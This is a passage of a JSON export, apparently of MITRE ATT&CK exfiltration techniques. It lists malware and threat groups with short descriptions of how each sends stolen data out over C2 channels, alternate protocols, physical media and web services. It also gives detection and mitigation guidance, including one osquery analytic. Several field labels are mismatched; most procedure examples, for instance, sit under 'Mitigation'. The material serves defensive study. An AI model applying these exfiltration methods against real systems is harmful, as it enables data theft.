        "description": "Bundlore uses the curl -s -L -o command to exfiltrate archived data to a URL.[2]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol.[4]"
      },
      {
        "id": "S0503",
        "name": "FrameworkPOS",
        "description": "FrameworkPOS can use DNS tunneling for exfiltration of credit card data.[5]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq connects to a predefined domain on port 443 to exfil gathered information.[6]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos can exfiltrate credentials over the network via UDP.[7]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has used a .NET tool named dog.exe to exiltrate information over an e-mail account.[8]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has sent locally staged files with collected credentials to C2 servers using cURL.[9]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor cloud-based file hosting services, such as Google Drive and Microsoft OneDrive, for unusual instances of file downloads – for example, many downloads by a single user in a short period of time. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies. Additionally, data loss prevention policies can be defined to detect and alert on exfiltration events on particularly sensitive data."
      },
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Access",
        "detects": "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set and are allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may steal data by exfiltrating it over a different protocol than that of the existing command and control channel."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for suspicious files (i.e. .pdf, .docx, .jpg, etc.) viewed in isolation that may steal data by exfiltrating it over a different protocol than that of the existing command and control channel."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1048.001",
        "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
      },
      {
        "id": "T1048.002",
        "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
      },
      {
        "id": "T1048.003",
        "name": "Exfiltration Over Unencrypted Non-C2 Protocol"
      }
    ],
    "Tactic": "\nExfiltration"
  },
  {
    "Title": "Exfiltration Over C2 Channel",
    "Code": "T1041",
    "Description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "Mitigation": [
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL exfiltrates data over the same channel used for C2.[1]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has sent victim data to its C2 servers.[2]"
      },
      {
        "id": "S0584",
        "name": "AppleJeus",
        "description": "AppleJeus has exfiltrated collected host information to a C2 server.[3]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can exfiltrate files via the C2 channel.[4]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that exfiltrates data over the C2 channel.[5]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32's backdoor has exfiltrated data using the already opened channel with its C&C server.[6]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has exfiltrated stolen victim data through C2 communications.[7]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth exfiltrates collected information from its r1.log file to the external C2 server. [8]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has exfiltrated data over the C2 channel.[9]"
      },
      {
        "id": "S1029",
        "name": "AuTo Stealer",
        "description": "AuTo Stealer can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.[10]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "Adversaries can direct BACKSPACE to upload files to the C2 Server.[11]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can exfiltrate data over the C2 channel.[12][13]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook can upload files from a victim's machine over the C2 channel.[14]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot exfiltrates data over its C2 channel.[15]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has added the exfiltrated data to the URL over the C2 channel.[16]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has sent user and system information to a C2 server via HTTP POST requests.[17][18]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT has exfiltrated data over its C2 channel.[19]"
      },
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon uploads files and data from a compromised host over the existing C2 channel.[20]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can send collected data in JSON format to C2.[21]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration.[22]"
      },
      {
        "id": "S0077",
        "name": "CallMe",
        "description": "CallMe exfiltrates data to its C2 server over the same protocol as C2 communications.[23]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.[24]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has exfiltrated data via HTTP to already established C2 servers.[25][26]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell can upload files over the C2 channel.[27]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.[28]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used Cobalt Strike C2 beacons for data exfiltration.[29]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can exfiltrate collected data via C2.[30]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has exfiltrated stolen files to its C2 server.[31]"
      },
      {
        "id": "S1024",
        "name": "CreepySnail",
        "description": "CreepySnail can connect to C2 for data exfiltration.[32]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can exfiltrate stolen information over its C2.[33]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch can exfiltrate data over the primary C2 channel (Dropbox HTTP API).[34]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink has the ability to upload exfiltrated files to a C2 server.[35]"
      },
      {
        "id": "S1021",
        "name": "DnsSystem",
        "description": "DnsSystem can exfiltrate collected data to its C2 server.[36]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki has used Ngrok to establish C2 and exfiltrate data.[37]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub can exfiltrate files over C2 infrastructure.[38]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky has exfiltrated data to the C2 server.[39]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to send information staged on a compromised host externally to C2.[40]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury can exfiltrate SSH credentials through custom DNS queries.[41]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has exfiltrated data over its C2 channel.[42][43]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can send data gathered from a target through the command and control channel.[44][45]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM can upload files over the C2 channel from the infected host.[46]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has exfiltrated data to the C2 server.[47]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy has sent data collected from a compromised host to its C2 servers.[48]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can remotely exfiltrate sensitive information from a compromised AD FS server.[49]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2.[45]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can execute commands, including gathering user information, and send the results to C2.[50]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data.[51]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server.[52]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy has exfiltrated host environment information to an external C2 domain via port 9006.[53]"
      },
      {
        "id": "S0588",
        "name": "GoldMax",
        "description": "GoldMax can exfiltrate files over the existing C2 channel.[54][55]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy has the ability to exfiltrate data over the Microsoft Outlook C2 channel.[56]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can send data it retrieves to the C2 server.[57]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent has sent data related to a compromise host over its C2 channel.[58]"
      },
      {
        "id": "S0391",
        "name": "HAWKBALL",
        "description": "HAWKBALL has sent system information and files over the C2 channel.[59]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa exfiltrated data over its C2 channel.[60]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has used its C2 channel to exfiltrate data.[61]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to download files from the infected host to the command and control (C2) server.[62]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "IceApple's Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.[63]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has uploaded a file containing debugger logs, network information and system information to the C2.[64]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.[65]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.[66]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has exfiltrated information gathered from the infected system to the C2 server.[67]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can send data from the victim host through a DNS C2 channel.[68]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can exfiltrate collected information from the host to the C2 server.[69]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has exfiltrated data over its C2 channel.[70][71]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has sent data and files to its C2 server.[72][73][74]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK has exfiltrated collected data to its C2 via POST requests.[75]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware.[76][77][78]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has exfiltrated data over its C2 channel.[79]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron exfiltrates data over its email C2 channel.[80]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower can send collected data, including screenshots, over its C2 channel.[81]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.[82]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used malware that exfiltrates stolen data to its C2 server.[83]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete's collected data is exfiltrated over the same channel used for C2.[84]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa exfiltrates data from a supplied path over its C2 channel.[85]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can send network system data and files to its C2 server.[86]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can exfiltrate locally stored data via its C2.[87]"
      },
      {
        "id": "S0459",
        "name": "MechaFlounder",
        "description": "MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2.[88]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can upload collected files and data to its C2 server.[89]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo can send the data it collects to the C2 server.[90]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has transmitted collected files and data to its C2 server.[91]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat has uploaded files and data to its C2 servers.[91]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications.[23]"
      },
      {
        "id": "S1026",
        "name": "Mongall",
        "description": "Mongall can upload files and information from a compromised host to its C2 server.[92]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used C2 infrastructure to receive exfiltrated data.[93]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "NETEAGLE is capable of reading files over the C2 channel.[11]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can use SMTP and DNS for file exfiltration and C2.[94]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT has used HTTP to receive stolen information from the infected machine.[95]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus has uploaded stolen files and data from a victim's machine over its C2 channel.[96]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Data exfiltration is done by Okrum using the already opened channel with the C2 server.[97]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE can upload files from the victim's machine to its C2 server.[98]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.[99]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors uploaded stolen files to their C2 servers.[100]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used the XServer backdoor to exfiltrate data.[101]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can upload files from a compromised host over its C2 channel.[102]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can upload files and information from a compromised host to its C2 servers.[50]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can execute the command code do_upload to send files to C2.[103]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull has the ability to exfiltrate stolen victim data through its C2 channel.[104]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has exfiltrated data over the C2 channel.[105]"
      },
      {
        "id": "S0441",
        "name": "PowerShower",
        "description": "PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.[106]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc performs data exfiltration over the control server channel using a custom protocol.[107]"
      },
      {
        "id": "S0078",
        "name": "Psylo",
        "description": "Psylo exfiltrates data to its C2 server over the same protocol as C2 communications.[23]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon exfiltrates screenshot files to its C2 server.[52]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.[108]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can send stolen information to C2 nodes including passwords, accounts, and emails.[109]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.[110]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.[111]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can exfiltrate host and malware information to C2 servers.[112]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2.[113]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can send collected files back over same C2 channel.[114]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro sends device and other collected data back to the C2 using the established C2 channels over TCP. [115]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type has uploaded data and files from a compromised host to its C2 servers.[91]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has sent system information to its C2 server using HTTP.[116]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has sent collected data from a compromised host to its C2 servers.[48]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.[117]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco can load a plugin to exfiltrate stolen files to SMB shares also used in C2.[94]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter sent generated reports to the C2 via HTTP POST requests.[118]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist has exfiltrated data over its C2 channel.[119]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can transfer files from an infected host to the C2 server.[120]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can exfiltrate files from the victim using the download command.[121]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.[122]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has exfiltrated data to its C2 server.[123]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT has uploaded collected data and files from a compromised host to its C2 server.[124]"
      },
      {
        "id": "S0543",
        "name": "Spark",
        "description": "Spark has exfiltrated data over the C2 channel.[125]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has exfiltrated victim data using HTTP POST requests to its C2 servers.[126]"
      },
      {
        "id": "S1037",
        "name": "STARWHALE",
        "description": "STARWHALE can exfiltrate collected data to its C2 servers.[127]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.[128]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can send data and files from a compromised host to its C2 server.[129]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can exfiltrate collected documents through C2 channels.[130][131]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet sends compromised victim information via HTTP.[132]"
      },
      {
        "id": "S1042",
        "name": "SUGARDUMP",
        "description": "SUGARDUMP has sent stolen credentials and other data to its C2 server.[133]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can send collected data in JSON format to its C2 server.[134]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate has exfiltrated data over its C2 channel.[135]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to send collected files over its C2.[136]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest exfiltrates targeted file extensions in the /Users/ folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.[137][138]"
      },
      {
        "id": "S0671",
        "name": "Tomiris",
        "description": "Tomiris can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.[139]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma can send victim data to an actor-controlled C2 server.[140]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can send information about the compromised host and upload data to a hardcoded C2 server.[141][142]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used HTTP POSTs to exfil gathered information.[143][144][145]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to exfiltrate data over the C2 channel.[146][147][148]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can send collected victim data to its C2 server.[149]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.[150][151]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can exfiltrate files from an infected machine to its C2 server.[152]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET exfiltrates data stolen from a system over its C2 channel.[153]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests.[154][155]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has exfiltrated files via the Dropbox API C2.[156]"
      },
      {
        "id": "S0086",
        "name": "ZLib",
        "description": "ZLib has sent data and files from a compromised host to its C2 servers.[91]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may steal data by exfiltrating it over an existing command and control channel."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for suspicious files (i.e. .pdf, .docx, .jpg, etc.) viewed in isolation that may steal data by exfiltrating it over an existing command and control channel."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts. Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on TCP network connection creation."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": "\nExfiltration"
  },
  {
    "Title": "Exfiltration Over Other Network Medium",
    "Code": "T1011",
    "Description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "Mitigation": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": "Disable WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel in local computer security settings or by group policy if it is not needed within an environment."
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": "Prevent the creation of new network adapters where possible.[1][2]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to exfiltrate data over a different network medium than the command and control channel"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for files being accessed that could be related to exfiltration, such as file reads by a process that also has an active network connection."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that may attempt to exfiltrate data over a different network medium than the command and control channel. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on TCP network connection creation. The below analytic is using an event ID from OSQuery. Analytic 1 - Windows Process Network Connection netcon_from_sysproc = filter process_open_sockets where remote_port != 0 AND proc_name!= '';\""
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows., such as the usage of abnormal/unexpected protocols."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1011.001",
        "name": "Exfiltration Over Bluetooth"
      }
    ],
    "Tactic": "\nExfiltration"
  },
  {
    "Title": "Exfiltration Over Physical Medium",
    "Code": "T1052",
    "Description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "Mitigation": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": "Data loss prevention can detect and block sensitive data being copied to physical mediums."
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": "Disable Autorun if it is unnecessary. [1] Disallow or restrict removable media at an organizational policy level if they are not required for business operations. [2]"
      },
      {
        "id": "M1034",
        "name": "Limit Hardware Installation",
        "description": "Limit the use of USB devices and removable media within a network."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to exfiltrate data via a physical medium, such as a removable drive."
      },
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Creation",
        "detects": "Monitor for newly assigned drive letters or mount points to a data storage device that may attempt to exfiltrate data via a physical medium, such as a removable drive."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor file access on removable media that may attempt to exfiltrate data via a physical medium, such as a removable drive."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes when removable media is mounted."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1052.001",
        "name": "Exfiltration over USB"
      }
    ],
    "Tactic": "\nExfiltration"
  },
  {
    "Title": "Exfiltration Over Web Service",
    "Code": "T1567",
    "Description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has exfiltrated files using web services.[1]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 can exfiltrate data over Google Drive.[2]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used Cloudflare services for data exfiltration.[3]"
      },
      {
        "id": "S0547",
        "name": "DropBook",
        "description": "DropBook has used legitimate web services to exfiltrate data.[4]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used the Telegram API sendMessage to relay data on compromised devices.[5]"
      },
      {
        "id": "S0508",
        "name": "ngrok",
        "description": "ngrok has been used by threat actors to configure servers for data exfiltration.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Review logs for SaaS services, including Office 365 and Google Workspace, to detect the configuration of new webhooks or other features that could be abused to exfiltrate data."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
